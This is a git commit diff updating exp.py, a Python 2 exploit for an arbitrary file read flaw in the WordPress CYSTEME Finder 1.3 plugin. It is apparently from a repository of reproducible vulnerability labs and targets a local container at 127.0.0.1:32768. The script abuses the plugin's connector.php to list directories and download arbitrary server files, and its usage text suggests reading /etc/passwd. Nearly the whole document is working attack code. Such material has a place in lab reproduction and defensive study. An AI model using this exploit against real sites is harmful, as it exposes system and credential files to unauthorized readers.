33d3ddce7a31bffb0c6d1dbc188366efbea1a0f7
Medicean <Medici.Yan@Gmail.com>
2016-12-24 15:38:03 +0800

    (Update Vul: WordPrees) CYSTEME Finder 1.3 任意文件读取漏洞

--- w/wordpress/3/exp.py
+++ w/wordpress/3/exp.py
@@ -5,27 +5,34 @@
 import httplib
 from json import loads
 
+TARGET_HOST = "127.0.0.1:32768"
+
+
 def common(path):
-    conn = httplib.HTTPConnection("127.0.0.1")
+    global TARGET_HOST
+    conn = httplib.HTTPConnection(TARGET_HOST)
     conn.request("GET", "/wp-content/plugins/cysteme-finder/php/connector.php?wphome=" + path + "&cmd=open&init=1&tree=1")
     return loads(conn.getresponse().read())
+
 
 def ls(path):
     try:
         data = common(path)["files"]
-        print ""    #空一行。
-        print "Total files: %d\n"  %len(data)
+        print
+        print "Total files: %d\n" % len(data)
         for counter in range(len(data)):
-	    if data[counter]["mime"]:
-                print data[counter]["mime"] , ":" ,
-	    else:
-                print "Unknown type" , ":" ,
+            if data[counter]["mime"]:
+                print data[counter]["mime"], ":",
+            else:
+                print "Unknown type", ":",
             print data[counter]["name"]
         print "\n"
     except KeyError:
         print "没有这个文件夹 / No such FOLDER\n"
 
+
 def cat(raw_path):
+    global TARGET_HOST
     path = ""
     split_path = raw_path.split("/")
     filename = split_path[-1]
@@ -34,18 +41,21 @@ def cat(raw_path):
         path += split_path[counter]
     try:
         data = common(path)["files"]
-        print ""    #空一行。
+        print
         for counter in range(len(data)):
             if data[counter]["name"] == filename:
-                hash = data[counter]["hash"]
-                conn = httplib.HTTPConnection("127.0.0.1")  
-                conn.request("GET", "/wp-content/plugins/cysteme-finder/php/connector.php?wphome=" + path + "&cmd=file&target=" + hash + "&download=1")  
+                hashstr = data[counter]["hash"]
+                conn = httplib.HTTPConnection(TARGET_HOST)
+                conn.request("GET", "/wp-content/plugins/cysteme-finder/php/connector.php?wphome=" + path + "&cmd=file&target=" + hashstr + "&download=1")
                 print conn.getresponse().read()
     except KeyError:
-        print "没有这个文件夹 / No such FOLDER\n" 
+        print "没有这个文件夹 / No such FOLDER\n"
 
 
-print "用法示例：ls /etc , cat /etc/passwd。请使用绝对路径。键入“exit”退出。\ne.g.: ls /etc , cat /etc/passwd. Please use ABSOLUTE PATH. Type exit to leave. \n"
+print "用法示例：ls /etc , cat /etc/passwd。请使用绝对路径。键入'exit'退出。\
+    \ne.g.: ls /etc , cat /etc/passwd. Please use ABSOLUTE PATH. Type \
+    exit to leave. \n"
+
 while True:
     raw_instruction = raw_input()
     instruction = raw_instruction.split()
